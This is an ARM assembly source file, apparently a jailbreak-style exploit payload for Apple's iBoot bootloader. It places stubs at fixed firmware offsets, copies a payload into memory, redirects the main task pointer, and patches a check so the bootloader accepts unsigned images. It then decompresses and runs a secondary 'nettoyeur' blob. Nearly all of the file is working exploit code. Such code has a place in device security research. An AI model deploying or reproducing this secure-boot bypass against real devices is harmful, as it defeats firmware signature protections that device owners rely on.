@ iboot_p1.s
@
@ Copyright (c) 2021 - 2023 @ kok3shidoll
@
@


    .text
    .syntax    unified


    .arm
_entry:
    b    _entry

    .org   0x94CC
    .thumb
    .thumb_func
_sub_5FF094CC:
    bx    lr

    .org   0x1e360
    .thumb
    .thumb_func
_get_current_task:
    bx    lr

    .org   0x1f2e4
    .arm
_sub_5FF1F2E4:
    bx    lr

    .org    0x1f730
    .thumb
    .thumb_func
_arch_cpu_quiesce:
    bx    lr

    .org    0x22890
    .thumb
    .thumb_func
_decompress_lzss:
    bx    lr


    .org    0x33B14
    .arm
_bcopy:
    bx    lr


    .org    0x34564
    .thumb
    .thumb_func
_disable_interrupts:
    bx    lr


    .org    0x46B60
    .thumb
    .thumb_func
_iboot_patch:
    movw   r0, #0x6B8e
    movt   r0, #0x5ff4              @ =0x5ff46b8e : end point of _iboot_patch()
    movw   r1, #0x1b00
    movt   r1, #0x4404              @ =0x44041b00 : payload
    movs   r2, #0x44                @ payload_sz
    blx    _bcopy

    movw   r1, #0x1b01
    movt   r1, #0x5ff4              @ =0x5ff41b01 : payload_base
    str    r1, [r4, 0xc04]          @ main_task ptr

    @mov    r1, #0x2400
    @strh    r1, [r4, #0xe2c]       @ console

    ldr    r0, =0x1848c
    ldr    r1, =0x60182000
    str    r1, [r4, r0]             @ accept unsigned images

    bl     _get_current_task

    b.n     _payload2


    .org    0x46eb0
    .global _payload
    .thumb
    .thumb_func
_payload:
    ldr     sp, =0x5ff00000
    add     sp, sp, #0xf8000
    bl     _disable_interrupts
    ldr    r4, =0x44000000

    ldr    r0, =0x5ff00000          @ could be 0, but we use explicit offset for iloader
    mov    r1, r4
    ldr    r2, =0x43dc0
    blx    _bcopy

    b.n    _iboot_patch

_payload2:
    movs   r1, #0
    str    r1, [r0, #0x44]

    movw   r0, #0x1b00
    movt   r0, #0x5ff4              @ dst
    movs   r1, #0xfc                @ dst_sz
    movw   r2, #0x6d3c
    movt   r2, #0x5ff4              @ nettoyeur
    movs   r3, #0xe4                @ nettoyeur_sz

    mov    r5, r0
    bl     _decompress_lzss
    @movw   r0, #0x94cd
    @movt   r0, #0x5ff0
    @blx    r0
    blx    _sub_5FF1F2E4
    bl     _arch_cpu_quiesce
    blx    r5                       @ nettoyeur()
    bx     r4

.align    2


    .org    0x46EFA
_next:
    nop

.align    2
